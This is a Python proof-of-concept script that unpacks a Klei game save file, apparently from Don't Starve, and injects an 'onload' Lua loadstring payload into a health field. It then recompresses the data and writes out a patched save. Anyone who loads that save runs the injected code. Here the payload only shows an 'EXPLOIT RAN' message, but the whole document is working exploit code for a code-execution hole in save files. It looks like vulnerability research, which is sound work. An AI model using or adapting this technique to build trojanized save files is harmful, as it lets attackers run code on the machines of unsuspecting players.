#!/usr/bin/env python3
import base64, zlib, struct

with open('save/SAVE/survival_1', 'rb') as f:
    raw = f.read()

MAGIC = b'KLEI     1D'
assert raw[:11] == MAGIC

decoded = base64.b64decode(raw[11:])
v1, v2, uncompressed_len, compressed_len = struct.unpack_from('<4I', decoded, 0)
data = zlib.decompress(decoded[0x10:])

old = b'health={health=150}'
new = b'health={health=150,onload="local f=loadstring([[DisplayError(EXPLOIT RAN)]]) if f then f() end"}'

print(f"Before: {old in data}")
print(f"Count before: {data.count(old)}")

data = data.replace(old, new, 1)

print(f"After: {old in data}")
print(f"Count after: {data.count(old)}")
print(f"New string present: {b'onload' in data}")

# Recompress
best, best_lvl = None, -1
for level in range(1, 10):
    candidate = zlib.compress(data, level)
    if best is None or abs(len(candidate) - compressed_len) < abs(len(best) - compressed_len):
        best, best_lvl = candidate, level

new_compressed = best
new_enc_hdr = struct.pack('<4I', v1, v2, len(data), len(new_compressed))
new_b64 = base64.b64encode(new_enc_hdr + new_compressed)
output = MAGIC + new_b64

with open('build/survival_1_patched', 'wb') as f:
    f.write(output)

print(f"Done: {len(output)} bytes")
